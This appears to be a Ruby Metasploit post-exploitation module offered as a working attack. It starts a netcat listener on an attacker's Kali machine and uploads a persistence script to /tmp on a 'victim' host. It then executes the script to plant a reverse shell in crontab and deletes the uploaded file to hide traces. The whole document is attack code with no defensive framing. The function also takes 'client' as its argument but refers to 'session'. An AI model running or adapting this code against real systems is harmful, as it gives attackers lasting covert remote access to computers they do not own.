def run_script(client)
# Define the paths for the persistence script
local_persistence_script = "/home/kali/Documents/persistence.sh" # Local path on the attacker's machine
remote_persistence_script = "/tmp/persistence.sh"                # Remote path on the victim's machine

# Step 1: Start the Netcat listener directly
print_status("Starting Netcat listener on the attacker's machine...")
listener_pid = spawn("nc -lvnp 1234")
Process.detach(listener_pid)
print_good("Netcat listener started successfully (PID: #{listener_pid}).")

# Step 2: Upload the persistence script to the victim machine
print_status("Uploading reverse shell persistence script to the victim machine...")
if File.exist?(local_persistence_script)
  session.fs.file.upload_file(remote_persistence_script, local_persistence_script)
  print_good("Reverse shell persistence script uploaded to the victim machine.")
else
  print_error("Persistence script does not exist on the attacker's machine.")
  return
end

# Step 3: Set the uploaded script as executable
print_status("Setting execute permissions for the uploaded script...")
cmd_exec("chmod +x #{remote_persistence_script}")

# Step 4: Execute the persistence script on the victim machine
print_status("Executing the reverse shell persistence script on the victim machine...")
output = cmd_exec("#{remote_persistence_script}")
if output.include?("added to crontab")
  print_good("Reverse shell added to crontab successfully.")
else
  print_error("Failed to add reverse shell to crontab.")
end

# Step 5: Stop the Netcat listener
print_status("Stopping the Netcat listener...")
begin
  Process.kill("TERM", listener_pid)
  print_good("Netcat listener stopped successfully.")
rescue Errno::ESRCH
  print_error("Netcat listener process not found.")
end

# Step 6: Clean up uploaded files on the victim machine
print_status("Cleaning up uploaded files...")
cmd_exec("rm -f #{remote_persistence_script}")
print_good("Uploaded script cleaned up.")
end
